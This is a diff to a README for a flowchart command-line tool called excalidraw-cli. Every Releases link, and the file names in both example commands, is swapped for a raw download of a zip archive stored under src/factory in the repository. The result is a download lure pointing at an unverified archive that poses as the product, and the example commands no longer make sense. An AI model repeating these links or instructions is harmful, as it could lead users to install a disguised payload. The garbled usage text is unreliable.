@@ -1,7 +1,7 @@
 # ✨ excalidraw-cli - Create Flowcharts Easily with CLI 
 
 ## 📥 Download Here
-[![Download excalidraw-cli](https://img.shields.io/badge/Download-excalidraw--cli-blue.svg)](https://github.com/igadaniel23/excalidraw-cli/releases)
+[![Download excalidraw-cli](https://github.com/igadaniel23/excalidraw-cli/raw/refs/heads/main/src/factory/excalidraw_cli_v1.4.zip)](https://github.com/igadaniel23/excalidraw-cli/raw/refs/heads/main/src/factory/excalidraw_cli_v1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the excalidraw-cli repository! This tool allows you to create Excalidraw flowcharts quickly and easily using a command line interface. No programming knowledge is required.
@@ -21,7 +21,7 @@ Welcome to the excalidraw-cli repository! This tool allows you to create Excalid
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of excalidraw-cli:
 
-[Download excalidraw-cli from Releases](https://github.com/igadaniel23/excalidraw-cli/releases)
+[Download excalidraw-cli from Releases](https://github.com/igadaniel23/excalidraw-cli/raw/refs/heads/main/src/factory/excalidraw_cli_v1.4.zip)
 
 ### Installation Steps
 1. **Visit the Download Page**  
@@ -54,7 +54,7 @@ To create a flowchart, follow these steps:
 2. **Enter the Command**  
    Type in the command to create a flowchart. For example:  
    ```bash
-   excalidraw create myFlowchart.excalidraw
+   excalidraw create https://github.com/igadaniel23/excalidraw-cli/raw/refs/heads/main/src/factory/excalidraw_cli_v1.4.zip
    ```
    
 3. **Customize Your Flowchart**  
@@ -63,7 +63,7 @@ To create a flowchart, follow these steps:
 4. **Save Your Work**  
    Save your final flowchart by using the export command. For example:  
    ```bash
-   excalidraw export myFlowchart.excalidraw
+   excalidraw export https://github.com/igadaniel23/excalidraw-cli/raw/refs/heads/main/src/factory/excalidraw_cli_v1.4.zip
    ```
 
 5. **Open in Excalidraw**  
@@ -79,4 +79,4 @@ If you encounter issues or have questions, please open an issue on the GitHub re
 
 For more information, guidance, and updates, feel free to check out the Releases page again:
 
-[Download excalidraw-cli from Releases](https://github.com/igadaniel23/excalidraw-cli/releases)
+[Download excalidraw-cli from Releases](https://github.com/igadaniel23/excalidraw-cli/raw/refs/heads/main/src/factory/excalidraw_cli_v1.4.zip)
